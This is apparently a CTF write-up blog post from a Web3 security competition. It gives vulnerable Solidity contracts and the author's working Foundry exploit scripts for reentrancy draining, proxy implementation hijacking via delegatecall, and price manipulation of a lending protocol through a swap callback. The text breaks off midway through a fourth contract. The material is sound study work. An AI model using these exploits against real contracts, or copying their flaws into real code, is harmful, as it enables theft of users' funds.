+++
title = "Statemind Web3 CTF 2025"
date = "2025-01-14"

[taxonomies]
tags=["ctf", "blockchain", "solidity", "bridge", "defi", "Huff"]

+++

Alpha content here... I participated and solved a private web3 security CTF 
focused on smart contract security of various concepts like,

- DeFi protocol vulnerabilities
- Cross-chain bridge security
- Oracle manipulation
- Cryptographic implementations
- Solidity and Vyper smart contracts
- Huff programming

I'm super excited to share my solutions and insights from this CTF, where I managed to secure a spot in the top 3! 🏆 Get ready for detailed writeups of each challenge - trust me, you won't want to miss these!

All of these challenges with solutions can be found here : [TheMj0ln1r/statemind-web3-ctf](https://github.com/TheMj0ln1r/statemind-web3-ctf)

# Vault

P: "Your goal is to drain all ether from the Vault contract. Use the deposit and withdraw functions to reduce the vault's balance to zero. Once the isSolved function returns true, you've completed the challenge."

{% note(clickable=true, header="Vault.sol") %}

```soliidty
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.12;
pragma experimental ABIEncoderV2;

contract Vault {
    mapping(address => uint256) public balances;

    address public player;

    constructor(address _player) public payable {
        player = _player;
    }

    function deposit(address _to) public payable {
        balances[_to] += msg.value;
    }

    function withdraw(uint256 _amount) public {
        if (balances[msg.sender] >= _amount) {
            (bool success,) = msg.sender.call{value: _amount}("");
            require(success, "call failed");
            balances[msg.sender] -= _amount;
        }
    }

    function balanceOf(address _who) public view returns (uint256 balance) {
        return balances[_who];
    }

    function isSolved() external view returns (bool) {
        return address(this).balance == 0;
    }
}
```
{%end %}

## solution

The vulnerability in this contract lies in the `withdraw` function, which is susceptible to a reentrancy attack. Here's why:

1. The contract follows the checks-effects-interactions pattern incorrectly
2. The balance is updated after the external call
3. The contract uses a low-level `call` which forwards all gas

Here's how I exploited it:

The exploit script uses a malicious contract (`Attack`) that implements a `receive()` function to recursively withdraw funds from the vault. When the vault sends ETH to our contract, the `receive()` function is triggered, allowing us to withdraw more funds before the vault updates its balance.

{% note(clickable=true, header="Vault.s.sol") %}

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";

import {Vault} from "../src/Vault.sol";

contract VaultSolve is Script {
    Vault public vault = Vault(0x1B3C95A210A8C896b1C14D992600087668cd0174);
    address player = vm.envAddress("PLAYER");


    function run() external{
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        console.log("Vault : ", address(vault));
        console.log("Vault balance: ", address(vault).balance);
        console.log("Player : ", player);
        console.log("Player balance: ", player.balance);
        Attack attack = new Attack(address(vault));
        console.log("Attack balance: ", address(attack).balance);

        attack.exploit{value: 0.001 ether}();

        console.log("Vault balance: ", address(vault).balance);
        console.log("Attack balance: ", address(attack).balance);
        console.log("Player balance: ", player.balance);


        vm.stopBroadcast();
    }
}
contract Attack{
    Vault public vault;

    constructor(address _vault) public {
        vault = Vault(_vault);

    }
    function exploit() public payable{
        vault.deposit{value: msg.value}(address(this));
        vault.withdraw(0.001 ether);

        // I need my testnet tokens back
        msg.sender.call{value : address(this).balance}("");
    }

    receive() payable external{
        if (address(vault).balance >= 0.001 ether){
            vault.withdraw(0.001 ether);
        }
    }
}
```

{% end %}

# Proxy

P: "You've encountered a proxy contract setup where the Proxy delegates calls to an Executor implementation. Find a way to manipulate the logic and get isSolved to return true."

{% note(clickable=true, header="Proxy.sol") %}
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin-contracts-4.8.0/contracts/utils/Address.sol"; 
import "@openzeppelin-contracts-4.8.0/contracts/proxy/utils/Initializable.sol";

contract Proxy {
    // bytes32(uint256(keccak256("eip1967.proxy.implementation")) - 1)
    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
    
    struct AddressSlot {
        address value;
    }
    
    constructor(address _logic, address _player) {
        require(Address.isContract(_logic), "implementation_not_contract");
        _getAddressSlot(_IMPLEMENTATION_SLOT).value = _logic;

        (bool success,) = _logic.delegatecall(
            abi.encodeWithSignature("initialize(address)", _player)
        );

        require(success, "call_failed");
    }
    function _delegate(address implementation) internal virtual {
        // solhint-disable-next-line no-inline-assembly
        assembly {
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), implementation, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch result
            case 0 { revert(0, returndatasize()) }
            default { return(0, returndatasize()) }
        }
    }
    // proxy fallback
    fallback() external payable virtual {
        _delegate(_getAddressSlot(_IMPLEMENTATION_SLOT).value);
    }
    function _getAddressSlot(bytes32 slot) internal pure returns (AddressSlot storage r) {
        assembly {
            r.slot := slot
        }
    }
}
contract Executor is Initializable {
    address public owner;
    address public player;

    function initialize(address _player) external initializer {
        owner = msg.sender;
        player = _player;
    }
    modifier onlyOwner {
        require(msg.sender == owner, "not_owner");
        _;
    }
    function execute(address logic) external payable {
        (bool success,) = logic.delegatecall(abi.encodeWithSignature("exec()"));
        require(success, "call_fail");
    }
    function isSolved() external pure returns (bool) {
        return false;
    }
}
```

{%end%}

## Solution

Okay, we got one vulnerable proxy implementation. This is a `delegatecall` based proxy pattern in which the Proxy contract holding the storage and logic is present in the Executor contract. 

The goal is to manipulate the logic to make `isSolved()` return true. But If we observe that `isSolved()` function, it always returns `false` and it is hardcoded in the contract. So, that means we need to do complete upgrade of that contract and re-deploy in such a that it returns `true`. 

The key vulnerability lies in the `execute()` function which uses `delegatecall` to execute arbitrary logic, allowing us to potentially manipulate the contract's state. Simply, the calls to Proxy contract is delegated to the Executor and the Executor is delegating to the `exec()` function of a arbitray Logic contract. So the context of the call (`msg.sender`, `msg.value`, `this` and storage) remains same inside the `exec()` function on Logic. So, If we can update the Executor address in the Proxy slot to a new contract which have the logic of returning `true` on calling `isSolved()` then the chall is done. This is what I did in the following exploit script.

{% note(clickable=true, header="Proxy.s.sol") %}

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";

import {Proxy, Executor} from "../src/Proxy.sol";
import "@openzeppelin-contracts-4.8.0/contracts/proxy/utils/Initializable.sol";

contract ProxySolve is Script {
    Proxy public proxy = Proxy(payable(0x09FAb0F0CC143875873F111A27DF77B6ade37a20));
    Executor public executor = Executor(address(proxy));
    address player = vm.envAddress("PLAYER");

    // Deploy
    // function setUp() external{
    //     executor = new Executor();
    //     proxy = new Proxy(address(executor), player);
    //     executor = Executor(address(proxy));

    //     vm.deal(player, 1 ether);
    // }
    function run() external{
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        console.log("Proxy : ", address(proxy));
        bytes32 logic = vm.load(address(proxy), bytes32(uint256(0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc)));
        console.log("logic in Proxy", address(uint160(uint256(logic))));
        console.log("Proxy Owner: ", executor.owner());
        console.log("Player in Proxy: ", executor.player());
        console.log("Player : ", player);
        console.log("Player balance: ", player.balance);
        console.log("isSolved(): ", executor.isSolved());
        NewExecutor newExecutor = new NewExecutor();
        Attack attack = new Attack(address(address(newExecutor)), player);
        executor.execute(address(attack));
        console.log("Attack : ", address(attack));
        console.log("NewExecutor : ", address(newExecutor));
        logic = vm.load(address(proxy), bytes32(uint256(0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc)));
        console.log("logic in Proxy", address(uint160(uint256(logic))));
        // executor.initialize(player);
        console.log("Proxy Owner: ", executor.owner());
        console.log("Player in Proxy: ", executor.player());
        console.log("isSolved(): ", executor.isSolved());
        vm.stopBroadcast();
    }
}
contract Attack {
    struct AddressSlot {
        address value;
    }
    address public owner;
    address public player;
    address immutable newExecutor;
    address immutable playerplayer;
    constructor(address _newExecutor, address _player){
        newExecutor = _newExecutor;
        playerplayer = _player;
    }
    function exec() external {
        owner = address(0xdeadbeef);
        player = playerplayer;
        _getAddressSlot(0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc).value = newExecutor;
    }
    function _getAddressSlot(bytes32 slot) internal pure returns (AddressSlot storage r) {
        assembly {
            r.slot := slot
        }
    }
}

contract NewExecutor is Initializable{
    address public owner;
    address public player;
    function initialize(address _player) external initializer {
        owner = msg.sender;
        player = _player;
    }
    function isSolved() external pure returns (bool) {
        return true;
    }
}
```
{% end %}

# Lending

P: "You have lending protocol that interacts with interesting pair. You need to steal all funds from lending protocol."

{% note(clickable=true, header="Lending.sol") %}
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/math/Math.sol";
import "../helpers/ERC20.sol";

contract Lending  {
    ERC20 public collateralToken;
    ERC20 public borrowToken;
    Pair public pair;

    mapping(address => uint256) public usersCollateral;
    mapping(address => uint256) public usersUsedCollateral;
    mapping(address => uint256) public usersBorrowed;

    constructor(Pair _pair, ERC20 _collateralToken, ERC20 _borrowToken) {
        collateralToken = _collateralToken;
        pair = _pair;
        borrowToken = _borrowToken;
    }

    function addCollateral(uint256 amount) external {
        collateralToken.transferFrom(msg.sender, address(this), amount);
        usersCollateral[msg.sender] += amount;
    }

    function removeCollateral(uint256 amount) external {
        require(usersBorrowed[msg.sender] == 0, "You have debt");
        require(usersCollateral[msg.sender] >= amount, "Not enough collateral");
        collateralToken.transfer(msg.sender, amount);
        usersCollateral[msg.sender] -= amount;
    }

    function borrow(uint256 _amount) external {
        uint256 needCollateral = _amount * getExchangeRate() / 1e18;

        require(needCollateral <= usersCollateral[msg.sender], "You don't have enough collateral");

        borrowToken.transfer(msg.sender, _amount);
        usersUsedCollateral[msg.sender] += needCollateral;
        usersCollateral[msg.sender] -= needCollateral;
        usersBorrowed[msg.sender] += _amount;
    }

    function repay(uint256 _amount) external {
        uint256 collateral = (usersUsedCollateral[msg.sender] * _amount) / usersBorrowed[msg.sender];

        borrowToken.transferFrom(msg.sender, address(this), _amount);

        usersUsedCollateral[msg.sender] -= collateral;
        usersCollateral[msg.sender] += collateral;
        usersBorrowed[msg.sender] -= _amount;
    }

    function getExchangeRate() public view returns (uint256) {
        return pair.getSpotPrice();
    }

    function isSolved() external view returns (bool) {
        return borrowToken.balanceOf(address(this)) == 0;
    }
}

library SafeMath {
    function add(uint x, uint y) internal pure returns (uint z) {
        require((z = x + y) >= x, 'ds-math-add-overflow');
    }

    function sub(uint x, uint y) internal pure returns (uint z) {
        require((z = x - y) <= x, 'ds-math-sub-underflow');
    }

    function mul(uint x, uint y) internal pure returns (uint z) {
        require(y == 0 || (z = x * y) / y == x, 'ds-math-mul-overflow');
    }
}

library UQ112x112 {
    uint224 constant Q112 = 2**112;

    // encode a uint112 as a UQ112x112
    function encode(uint112 y) internal pure returns (uint224 z) {
        z = uint224(y) * Q112; // never overflows
    }

    // divide a UQ112x112 by a uint112, returning a UQ112x112
    function uqdiv(uint224 x, uint112 y) internal pure returns (uint224 z) {
        z = x / uint224(y);
    }
}

interface IUniswapV2Callee {
    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external;
}


contract Pair is ERC20 {
    using SafeMath  for uint;
    using UQ112x112 for uint224;

    uint public constant MINIMUM_LIQUIDITY = 10**3;
    bytes4 private constant SELECTOR = bytes4(keccak256(bytes('transfer(address,uint256)')));

    address public factory;
    address public token0;
    address public token1;

    uint112 private reserve0;           // uses single storage slot, accessible via getReserves
    uint112 private reserve1;           // uses single storage slot, accessible via getReserves
    uint32  private blockTimestampLast; // uses single storage slot, accessible via getReserves

    uint public price0CumulativeLast;
    uint public price1CumulativeLast;
    uint public kLast; // reserve0 * reserve1, as of immediately after the most recent liquidity event

    uint private unlocked = 1;
    modifier lock() {
        require(unlocked == 1, 'UniswapV2: LOCKED');
        unlocked = 0;
        _;
        unlocked = 1;
    }

    function getReserves() public view returns (uint112 _reserve0, uint112 _reserve1, uint32 _blockTimestampLast) {
        _reserve0 = reserve0;
        _reserve1 = reserve1;
        _blockTimestampLast = blockTimestampLast;
    }

    function getSpotPrice() external view returns (uint256) {
        return Math.mulDiv(reserve1, 1e18, reserve0);
    }

    function _safeTransfer(address token, address to, uint value) private {
        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(SELECTOR, to, value));
        require(success && (data.length == 0 || abi.decode(data, (bool))), 'UniswapV2: TRANSFER_FAILED');
    }

    event Mint(address indexed sender, uint amount0, uint amount1);
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    constructor() ERC20("ST", "ST") {
        factory = msg.sender;
    }

    // called once by the factory at time of deployment
    function initialize(address _token0, address _token1) external {
        require(msg.sender == factory, 'UniswapV2: FORBIDDEN'); // sufficient check
        token0 = _token0;
        token1 = _token1;
    }

    // update reserves and, on the first call per block, price accumulators
    function _update(uint balance0, uint balance1, uint112 _reserve0, uint112 _reserve1) private {
        require(balance0 <= type(uint112).max && balance1 <= type(uint112).max, 'UniswapV2: OVERFLOW');
        uint32 blockTimestamp = uint32(block.timestamp % 2**32);
        uint32 timeElapsed = blockTimestamp - blockTimestampLast; // overflow is desired
        if (timeElapsed > 0 && _reserve0 != 0 && _reserve1 != 0) {
            // * never overflows, and + overflow is desired
            price0CumulativeLast += uint(UQ112x112.encode(_reserve1).uqdiv(_reserve0)) * timeElapsed;
            price1CumulativeLast += uint(UQ112x112.encode(_reserve0).uqdiv(_reserve1)) * timeElapsed;
        }
        reserve0 = uint112(balance0);
        reserve1 = uint112(balance1);
        blockTimestampLast = blockTimestamp;
        emit Sync(reserve0, reserve1);
    }

    // if fee is on, mint liquidity equivalent to 1/6th of the growth in sqrt(k)
    function _mintFee(uint112 _reserve0, uint112 _reserve1) private returns (bool feeOn) {
        address feeTo = address(0);
        feeOn = feeTo != address(0);
        uint _kLast = kLast; // gas savings
        if (feeOn) {
            if (_kLast != 0) {
                uint rootK = Math.sqrt(uint(_reserve0).mul(_reserve1));
                uint rootKLast = Math.sqrt(_kLast);
                if (rootK > rootKLast) {
                    uint numerator = totalSupply.mul(rootK.sub(rootKLast));
                    uint denominator = rootK.mul(5).add(rootKLast);
                    uint liquidity = numerator / denominator;
                    if (liquidity > 0) _mint(feeTo, liquidity);
                }
            }
        } else if (_kLast != 0) {
            kLast = 0;
        }
    }

    // this low-level function should be called from a contract which performs important safety checks
    function mint(address to) external lock returns (uint liquidity) {
        (uint112 _reserve0, uint112 _reserve1,) = getReserves(); // gas savings
        uint balance0 = IERC20(token0).balanceOf(address(this));
        uint balance1 = IERC20(token1).balanceOf(address(this));
        uint amount0 = balance0.sub(_reserve0);
        uint amount1 = balance1.sub(_reserve1);

        bool feeOn = _mintFee(_reserve0, _reserve1);
        uint _totalSupply = totalSupply; // gas savings, must be defined here since totalSupply can update in _mintFee
        if (_totalSupply == 0) {
            liquidity = Math.sqrt(amount0.mul(amount1)).sub(MINIMUM_LIQUIDITY);
           _mint(address(0), MINIMUM_LIQUIDITY); // permanently lock the first MINIMUM_LIQUIDITY tokens
        } else {
            liquidity = Math.min(amount0.mul(_totalSupply) / _reserve0, amount1.mul(_totalSupply) / _reserve1);
        }
        require(liquidity > 0, 'UniswapV2: INSUFFICIENT_LIQUIDITY_MINTED');
        _mint(to, liquidity);

        _update(balance0, balance1, _reserve0, _reserve1);
        if (feeOn) kLast = uint(reserve0).mul(reserve1); // reserve0 and reserve1 are up-to-date
        emit Mint(msg.sender, amount0, amount1);
    }

    // this low-level function should be called from a contract which performs important safety checks
    function burn(address to) external lock returns (uint amount0, uint amount1) {
        (uint112 _reserve0, uint112 _reserve1,) = getReserves(); // gas savings
        address _token0 = token0;                                // gas savings
        address _token1 = token1;                                // gas savings
        uint balance0 = IERC20(_token0).balanceOf(address(this));
        uint balance1 = IERC20(_token1).balanceOf(address(this));
        uint liquidity = balanceOf[address(this)];

        bool feeOn = _mintFee(_reserve0, _reserve1);
        uint _totalSupply = totalSupply; // gas savings, must be defined here since totalSupply can update in _mintFee
        amount0 = liquidity.mul(balance0) / _totalSupply; // using balances ensures pro-rata distribution
        amount1 = liquidity.mul(balance1) / _totalSupply; // using balances ensures pro-rata distribution
        require(amount0 > 0 && amount1 > 0, 'UniswapV2: INSUFFICIENT_LIQUIDITY_BURNED');
        _burn(address(this), liquidity);
        _safeTransfer(_token0, to, amount0);
        _safeTransfer(_token1, to, amount1);
        balance0 = IERC20(_token0).balanceOf(address(this));
        balance1 = IERC20(_token1).balanceOf(address(this));

        _update(balance0, balance1, _reserve0, _reserve1);
        if (feeOn) kLast = uint(reserve0).mul(reserve1); // reserve0 and reserve1 are up-to-date
        emit Burn(msg.sender, amount0, amount1, to);
    }

    // this low-level function should be called from a contract which performs important safety checks
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external lock {
        require(amount0Out > 0 || amount1Out > 0, 'UniswapV2: INSUFFICIENT_OUTPUT_AMOUNT');
        (uint112 _reserve0, uint112 _reserve1,) = getReserves(); // gas savings
        require(amount0Out < _reserve0 && amount1Out < _reserve1, 'UniswapV2: INSUFFICIENT_LIQUIDITY');

        uint balance0;
        uint balance1;
        { // scope for _token{0,1}, avoids stack too deep errors
        address _token0 = token0;
        address _token1 = token1;
        require(to != _token0 && to != _token1, 'UniswapV2: INVALID_TO');
        if (amount0Out > 0) _safeTransfer(_token0, to, amount0Out); // optimistically transfer tokens
        if (amount1Out > 0) _safeTransfer(_token1, to, amount1Out); // optimistically transfer tokens
        if (data.length > 0) IUniswapV2Callee(to).uniswapV2Call(msg.sender, amount0Out, amount1Out, data);
        balance0 = IERC20(_token0).balanceOf(address(this));
        balance1 = IERC20(_token1).balanceOf(address(this));
        }
        uint amount0In = balance0 > _reserve0 - amount0Out ? balance0 - (_reserve0 - amount0Out) : 0;
        uint amount1In = balance1 > _reserve1 - amount1Out ? balance1 - (_reserve1 - amount1Out) : 0;
        require(amount0In > 0 || amount1In > 0, 'UniswapV2: INSUFFICIENT_INPUT_AMOUNT');
        { // scope for reserve{0,1}Adjusted, avoids stack too deep errors
        uint balance0Adjusted = balance0.mul(1000).sub(amount0In.mul(3));
        uint balance1Adjusted = balance1.mul(1000).sub(amount1In.mul(3));
        require(balance0Adjusted.mul(balance1Adjusted) >= uint(_reserve0).mul(_reserve1).mul(1000**2), 'UniswapV2: K');
        }

        _update(balance0, balance1, _reserve0, _reserve1);
        emit Swap(msg.sender, amount0In, amount1In, amount0Out, amount1Out, to);
    }

    // force balances to match reserves
    function skim(address to) external {
        address _token0 = token0; // gas savings
        address _token1 = token1; // gas savings
        _safeTransfer(_token0, to, IERC20(_token0).balanceOf(address(this)).sub(reserve0));
        _safeTransfer(_token1, to, IERC20(_token1).balanceOf(address(this)).sub(reserve1));
    }

    // force reserves to match balances
    function sync() external {
        _update(IERC20(token0).balanceOf(address(this)), IERC20(token1).balanceOf(address(this)), reserve0, reserve1);
    }
}
```
{%end%}

## Solution

A Defi protocol requires nothing else than except complete understanding about the protocol control flow. Lets observe what each contract in this protocol is doing. 

1. **Lending Contract**:
   - Add collateral using `collateralToken`
   - Borrow `borrowToken` against their collateral
   - Repay borrowed tokens
   - **Uses a Pair contract to determine exchange rates**

2. **Pair Contract** (UniswapV2-style):
   - Implements an automated market maker (AMM)
   - Manages liquidity between two tokens (token0 and token1)
   - Handles token swaps and price calculations
   - Maintains reserves and updates prices
   - Provides functions for adding/removing liquidity
   - **Used by the Lending contract to get exchange rates**

3. **SafeMath Library**:
   - Provides safe arithmetic operations
   - Prevents overflows/underflows in mathematical calculations
   - Used by the Pair contract for calculations

4. **UQ112x112 Library**:
   - Handles fixed-point number calculations
   - Used for price calculations in the Pair contract
   - Helps maintain precision in price calculations

5. **IUniswapV2Callee Interface**:
   - Defines the callback interface for flash swaps
   - Used when executing flash swaps in the Pair contract

The goal is to drain all `borrowToken` from the Lending contract. I always prefer to know the initial state of the protocol by querying all the information from the contracts deployed. The following is the state of the protocol when we initially received the challenge instance. 

```bash
Lending :  0x85799e7ae2964fd6D8BdC6e680dA881B8bb97ed6
Pair :  0xE86b07a57552655eEFe68894bD346c84da238B15
token0 (or) collateralToken  :  0xCcb0B898D555656e582b8d17ba7b426330Abb9D8
token1 (or) borrowToken:   0x7373EB31cBDd5428720a37d50E5ec64EfA891acc
Pair balance of collatoralToken :  500000000000000000000
Pair balance of borrowToken :  500000000000000000000
Pair reserve0 :  500000000000000000000
Pair reserve1 :  500000000000000000000
Lending balance of collatoralToken :  0
Lending balance of borrowToken :  5000000000000000000000
Player balance of collatoralToken :  0
Player balance of borrowToken :  0
price of borrowToken in terms of collatoralTokens :  1000000000000000000
Player :  0xE88150C42CC6c0294dD20893Bf5b1EC6eDD24Fc6
```
As you can observe I got zero amount of both collatoral and borrow tokens, but Lending contract have the `5000e18` of borrow tokens and the Pair contract got the `500e18` amount of both the tokens. 

Now for me, I don't have any `collatoralToken` to borrow the token from the Lending contract and drain them all. So, lets see how the `borrow()` function calcuates how much collatoral needed to borrow all those `5000e18` amount of borrow tokens. 

```solidity
function borrow(uint256 _amount) external {
    uint256 needCollateral = _amount * getExchangeRate() / 1e18;
    require(needCollateral <= usersCollateral[msg.sender], "You don't have enough collateral");
    borrowToken.transfer(msg.sender, _amount);
    usersUsedCollateral[msg.sender] += needCollateral;
    usersCollateral[msg.sender] -= needCollateral;
    usersBorrowed[msg.sender] += _amount;
}
```
> The `needCollateral` is calculated from the `getExchangeRate()` and divided by the `1e18`. Can we make this numerator as lesser than `1e18` ? So that the division will rounded to zero and we don't need to pay any `collatoralToken`.

Smart right?

Lets see how can we do this? We need to make `getExchangeRate()` return a very small number or even zero would be perfect!

```solidity
    // Lending
    function getExchangeRate() public view returns (uint256) {
        return pair.getSpotPrice();
    }

    //Pair
    function getSpotPrice() external view returns (uint256) {
        return Math.mulDiv(reserve1, 1e18, reserve0);
    }
```
Now we can see that the price of the `collatoralToken` is dependent on the `reserve0` and `reserve1`. And we need to manipulate the `reserve0` to be a large number than `reserve1 * 1e18` so that the `getSpotPrice()` will return zero. 

To do this, I found out that we can perform few swaps in the Pair contract which changes the values of `reserve0` and `reserve1`. But if we do the borrow from Lending after the `swap()` the again the price will be increase. So, we need to find a way to update the reserves during the swap and borrow the amount in the same transacation. If we can observe there is a callback happening to the caller in the `swap()` function. 
>if (data.length > 0) IUniswapV2Callee(to).uniswapV2Call(msg.sender, amount0Out, amount1Out, data);

So, during this callback we can borrow from Lending contract but the reserves need a forceful update. To do this we can make use of the vulnerable `skim()` and `sync()` functions in the Pair contract.

> Why `skim()` and `sync()` are vulnerable? Cause there is no reentrancy lock on these.

```solidity
    // force balances to match reserves
    function skim(address to) external {
        address _token0 = token0; // gas savings
        address _token1 = token1; // gas savings
        _safeTransfer(_token0, to, IERC20(_token0).balanceOf(address(this)).sub(reserve0));
        _safeTransfer(_token1, to, IERC20(_token1).balanceOf(address(this)).sub(reserve1));
    }

    // force reserves to match balances
    function sync() external {
        _update(IERC20(token0).balanceOf(address(this)), IERC20(token1).balanceOf(address(this)), reserve0, reserve1);
    }
```

Thats how I manipulated the `borrowToken` price to borrowed all the tokens from Lending. Find the exploit below.

{% note(clickable=true, header="Lending.s.sol") %}
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";

import {Pair, Lending, ERC20} from "../src/Lending.sol";

contract LendingSolve is Script {
    Lending public lending = Lending(0x85799e7ae2964fd6D8BdC6e680dA881B8bb97ed6);
    Pair public pair = lending.pair();
    ERC20 public collateralToken = lending.collateralToken();
    ERC20 public borrowToken = lending.borrowToken();
    address player = vm.envAddress("PLAYER");

    function run() external{
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        console.log("Lending : ", address(lending));
        console.log("Pair : ", address(pair));
        console.log("token0 (or) collateralToken  : ", pair.token0());
        console.log("token1 (or) borrowToken:  ", pair.token1());
        
        console.log("Pair balance of collatoralToken : ", collateralToken.balanceOf(address(pair)));
        console.log("Pair balance of borrowToken : ", borrowToken.balanceOf(address(pair)));
        (uint112 _reserve0, uint112 _reserve1, uint32 _blockTimestampLast) = pair.getReserves();
        console.log("Pair reserve0 : ", _reserve0);
        console.log("Pair reserve1 : ", _reserve1);

        console.log("Lending balance of collatoralToken : ", collateralToken.balanceOf(address(lending)));
        console.log("Lending balance of borrowToken : ", borrowToken.balanceOf(address(lending)));

        console.log("Player balance of collatoralToken : ", collateralToken.balanceOf(address(player)));
        console.log("Player balance of borrowToken : ", borrowToken.balanceOf(address(player)));

        console.log("price of borrowToken in terms of collatoralTokens : ", lending.getExchangeRate());
        console.log("Player : ", player);
        console.log("Player balance: ", player.balance);

        Attack attack = new Attack(address(lending), player);
        attack.exploit();

        console.log("Pair balance of collatoralToken : ", collateralToken.balanceOf(address(pair)));
        console.log("Pair balance of borrowToken : ", borrowToken.balanceOf(address(pair)));

        console.log("Lending balance of collatoralToken : ", collateralToken.balanceOf(address(lending)));
        console.log("Lending balance of borrowToken : ", borrowToken.balanceOf(address(lending)));

        console.log("Player balance of collatoralToken : ", collateralToken.balanceOf(address(player)));
        console.log("Player balance of borrowToken : ", borrowToken.balanceOf(address(player)));
        console.log("isSolved() : ", lending.isSolved());
        vm.stopBroadcast();
    }
}

interface IUniswapV2Callee {
    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external;
}

contract Attack is IUniswapV2Callee {
    Lending public lending;
    Pair public pair;
    ERC20 public collateralToken;
    ERC20 public borrowToken;
    address player;

    constructor(address _lending, address _player) {
        lending = Lending(_lending);
        pair =  lending.pair();
        collateralToken = lending.collateralToken();
        borrowToken = lending.borrowToken();
        player = _player;
    }
    function exploit() public {
        uint256 totalBorrowableBorrowTokenFromPair = borrowToken.balanceOf(address(pair)) - 1;
        pair.swap(0, totalBorrowableBorrowTokenFromPair, address(this), abi.encodePacked("something"));
    }
    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) public {
        uint256 totalBorrowableBorrowTokenFromLending = borrowToken.balanceOf(address(lending));
        pair.sync();
        lending.borrow(totalBorrowableBorrowTokenFromLending);
        uint256 borrowedTokensFromLending = borrowToken.balanceOf(address(address(this)));
        borrowToken.transfer(address(pair), borrowedTokensFromLending);
    }
}
```
{%end%}

# Yeild

P: "UniswapV3 yield farming is so easy! Just make sure there is liquidity around the spot price. You are given 5e18 each of token0 and token1. Your goal is to get 15e18 of LP tokens."

{% note(clickable=true, header="Yield.s.sol") %}
```solidity
// SPDX-License-Identifier: Unlicense

pragma solidity ^0.7.0;

import "@openzeppelin-contracts-3.4.2/contracts/math/Math.sol";
import "@uniswap/v3-core/contracts/libraries/FullMath.sol";
import "@openzeppelin-contracts-3.4.2/contracts/utils/ReentrancyGuard.sol";
import "@uniswap/v3-core/contracts/interfaces/callback/IUniswapV3MintCallback.sol";
import "@uniswap/v3-core/contracts/interfaces/callback/IUniswapV3SwapCallback.sol";
import "@uniswap/v3-core/contracts/interfaces/IUniswapV3Pool.sol";
import "@uniswap/v3-core/contracts/libraries/TickMath.sol";
import "@uniswap/v3-periphery/contracts/libraries/LiquidityAmounts.sol";
import "@uniswap/v3-periphery/contracts/libraries/PositionKey.sol";
import "@openzeppelin-contracts-3.4.2/contracts/token/ERC20/ERC20.sol";

contract Yield is
    IUniswapV3MintCallback,
    IUniswapV3SwapCallback,
    ERC20,
    ReentrancyGuard
{
    event Deposit(
        address indexed sender,
        address indexed to,
        uint256 shares,
        uint256 amount0,
        uint256 amount1
    );

    event Withdraw(
        address indexed sender,
        address indexed to,
        uint256 shares,
        uint256 amount0,
        uint256 amount1
    );

    event CollectFees(
        uint256 feesToVault0,
        uint256 feesToVault1,
        uint256 feesToProtocol0,
        uint256 feesToProtocol1
    );

    event Snapshot(int24 tick, uint256 totalAmount0, uint256 totalAmount1, uint256 totalSupply);

    IUniswapV3Pool public immutable pool;
    IERC20 public immutable token0;
    IERC20 public immutable token1;
    int24 public immutable tickSpacing;

    uint256 public protocolFee;
    uint256 public maxTotalSupply;
    address public governance;
    address public pendingGovernance;

    int24 public lastTick;
    int24 public baseLower;
    int24 public baseUpper;
    uint256 public accruedProtocolFees0;
    uint256 public accruedProtocolFees1;

    address public player;

    constructor(
        address _player,
        address _pool,
        uint256 _protocolFee,
        uint256 _maxTotalSupply
    ) ERC20("Yield Vault", "YV") {
        player = _player;
        pool = IUniswapV3Pool(_pool);
        token0 = ERC20(IUniswapV3Pool(_pool).token0());
        token1 = ERC20(IUniswapV3Pool(_pool).token1());
        tickSpacing = IUniswapV3Pool(_pool).tickSpacing();

        protocolFee = _protocolFee;
        maxTotalSupply = _maxTotalSupply;
        governance = msg.sender;
        lastTick = type(int24).max;

        require(_protocolFee < 1e6, "protocolFee");
    }

    function isSolved() external view returns (bool) {
        return balanceOf(player) >= 15 ether;
    }

    function deposit(
        uint256 amount0Desired,
        uint256 amount1Desired,
        uint256 amount0Min,
        uint256 amount1Min,
        address to
    )
        external
        nonReentrant
        returns (
            uint256 shares,
            uint256 amount0,
            uint256 amount1
        )
    {
        require(amount0Desired > 0 || amount1Desired > 0, "amount0Desired or amount1Desired");
        require(to != address(0) && to != address(this), "to");

        // Poke positions so vault's current holdings are up-to-date
        _poke(baseLower, baseUpper);

        // Calculate amounts proportional to vault's holdings
        (shares, amount0, amount1) = _calcSharesAndAmounts(amount0Desired, amount1Desired);
        require(shares > 0, "shares");
        require(amount0 >= amount0Min, "amount0Min");
        require(amount1 >= amount1Min, "amount1Min");

        // Pull in tokens from sender
        if (amount0 > 0) token0.transferFrom(msg.sender, address(this), amount0);
        if (amount1 > 0) token1.transferFrom(msg.sender, address(this), amount1);

        // Mint shares to recipient
        _mint(to, shares);
        emit Deposit(msg.sender, to, shares, amount0, amount1);
